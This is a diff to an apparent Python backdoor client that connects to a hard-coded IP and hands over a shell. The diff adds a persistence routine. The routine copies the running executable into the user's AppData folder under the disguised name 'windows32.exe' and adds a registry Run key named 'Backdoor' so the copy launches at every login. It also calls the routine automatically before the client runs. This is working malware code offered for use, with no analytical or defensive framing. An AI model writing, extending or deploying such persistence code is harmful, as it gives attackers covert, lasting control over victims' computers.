@@ -3,9 +3,10 @@ import socket
 # from termcolor import colored
 import subprocess
 import json
-from sys import exit
+import sys
 import os
 import base64
+import shutil
 
 
 HOST = '192.168.0.94'
@@ -69,4 +70,11 @@ def client():
 			shell(s)
 
 
+def persistence():
+	location = os.environ['appdata'] + '\\windows32.exe'
+	if not os.path.exists(location):
+		shutil.copyfile(sys.executable, location)
+		subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True )
+
+persistence()
 client()
